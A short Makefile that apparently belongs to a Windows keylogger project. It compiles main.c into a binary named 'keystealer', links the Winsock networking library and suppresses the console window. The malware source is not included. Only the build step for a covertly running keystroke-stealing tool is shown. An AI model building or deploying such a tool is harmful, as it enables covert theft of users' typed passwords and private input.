CFLAGS = -mwindows -lws2_32
all:
	@echo [+] Compiling keylogger...
	@gcc main.c -o keystealer $(CFLAGS)